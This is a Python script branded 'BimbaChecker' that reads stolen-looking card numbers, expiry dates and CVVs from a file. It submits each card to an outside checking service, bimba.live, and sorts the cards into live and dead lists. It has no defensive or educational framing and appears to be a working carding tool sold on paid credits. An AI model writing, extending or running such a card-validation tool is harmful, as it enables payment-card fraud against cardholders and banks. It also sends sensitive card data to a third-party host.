import requests

def print_banner():
    banner = """
 ____  _           _            ____ _               _
| __ )(_)_ __ ___ | |__   __ _ / ___| |__   ___  ___| | _____ _ __ 
|  _ \| | '_ ` _ \| '_ \ / _` | |   | '_ \ / _ \/ __| |/ / _ \ '__|
| |_) | | | | | | | |_) | (_| | |___| | | |  __/ (__|   <  __/ |   
|____/|_|_| |_| |_|_.__/ \__,_|\____|_| |_|\___|\___|_|\_\___|_| 
    """
    print(banner)

def check_card_status(username, card_number, expiry_month, expiry_year, cvv):
    url = f"https://bimba.live/api/br1?username={username}&cc={card_number}|{expiry_month}|{expiry_year}|{cvv}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        
        if data.get("status") == "error":
            print(data.get("message"))
            return False
        
        status = data.get("status")
        response_message = data.get("response", "")
        credits_remaining = data.get("credits_remaining", "0")
        card_info = data.get("card", "")
        bank_info = data.get("bank", "")
        
        # Simplify the response message
        response_parts = response_message.split(':')
        if len(response_parts) > 3:
            response_message = response_parts[2].strip()
        
        status_color = "\033[91m" if status == "DEAD" else "\033[92m" if status == "LIVE" else "\033[93m"  # Red for DEAD, Green for LIVE, Yellow for UNKNOWN
        reset_color = "\033[0m"
        
        result = f"{status_color}{status}{reset_color} | {response_message} | CRE {credits_remaining} | {card_info} | {bank_info}"
        print(result)
        
        # Write to appropriate file without color codes
        plain_result = f"{status} | {response_message} | CRE {credits_remaining} | {card_info} | {bank_info}"
        if status == "DEAD":
            with open("dead.txt", "a") as dead_file:
                dead_file.write(plain_result + "\n")
        elif status == "LIVE":
            with open("live.txt", "a") as live_file:
                live_file.write(plain_result + "\n")
        else:
            with open("unknown.txt", "a") as unknown_file:
                unknown_file.write(plain_result + "\n")
        
        # Return credits remaining as integer if possible, otherwise return a large number
        return int(credits_remaining) if credits_remaining.isdigit() else float('inf')
    else:
        print("Failed to retrieve data from API")
        return False

def main():
    print_banner()
    username = input("Username: ")
    
    with open("cc.txt", "r") as file:
        card_lines = file.readlines()
    
    credits_remaining = None
    remaining_cards = []
    for line in card_lines:
        card_details = line.strip().split('|')
        if len(card_details) == 4:
            card_number, expiry_month, expiry_year, cvv = card_details
            credits_remaining = check_card_status(username, card_number, expiry_month, expiry_year, cvv)
            if credits_remaining is False:
                break
        else:
            remaining_cards.append(line.strip())
    
    if credits_remaining is not False and credits_remaining is not None and credits_remaining < 5:
        print("Please topup credits first. @bimbacheck")
    
    # Write remaining cards back to cc.txt
    with open("cc.txt", "w") as file:
        for card in remaining_cards:
            file.write(card + "\n")

if __name__ == "__main__":
    main()